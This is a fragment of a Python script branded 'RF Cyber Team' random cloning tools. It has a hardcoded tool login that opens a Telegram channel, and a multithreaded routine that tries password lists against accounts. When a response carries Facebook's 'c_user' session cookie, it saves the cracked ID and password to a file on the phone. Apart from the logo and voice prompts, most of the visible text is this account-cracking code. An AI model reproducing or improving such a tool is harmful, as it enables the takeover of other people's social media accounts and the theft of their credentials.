...
$$$$$$/ $$/   $$/ $$/       $$$$$$/  
  ...
  """)
os.system('clear')  
os.system('espeak -a 300 " Welcome to, RF Cyber team ,,"')    
os.system('espeak -a 300 " inter Username,,"')        
print(logo)
print("\n\n\t\033[0;92m    ☠️ 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 RF CYBER TEAM TOOLS🚫?")
print("   \033[0;96m   🔥  CYBER RABBI 𝗥𝗔𝗡𝗗𝗢𝗠 𝗖𝗟𝗢𝗡𝗜𝗡𝗚 𝗧𝗢𝗢𝗟𝗦  💯?")
time.sleep(3)
attemps = 0
while attemps < 12345677901:
    ...
    if username == 'RF' and password == 'CYBER':
        print('\n\t\033[0;92mYou Have Successfully Logged in.')
        time.sleep(2)
        os.system('espeak -a 300 " loging successfuly,,"')
        os.system("xdg-open https://t.me/rfcyberteam")
        break
    else:
        print('\n\t\033[0;91mIncorrect Pass Please Trying ')
        time.sleep(2)
        os.system('espeak -a 300 " incorrect password, please contact, tools admin, Ariyan vau,,"')
        os.system("xdg-open https://t.me/rfcyberteam")
        os.system('clear')
        attemps += 1
        continue
...
def sykology():
    ...
    with ThreadPool(max_workers=100) as feel:
        ...
        print(logo)
        tl=str(len(Ariyan))
        print(f"    \033[38;5;46mID SAVE: /\033[38;5;47msdcard/\033[38;5;49mAriyan-ok.txt") 
    ...
    try:
        for ps in pwx:
            ...
            if "c_user" in eehhcc:
                ...
                open("/sdcard/Ariyan-ok.txt","a").write(xd+"|"+ps+"\n")
                oks.append(uid)
                break
            else:
                continue
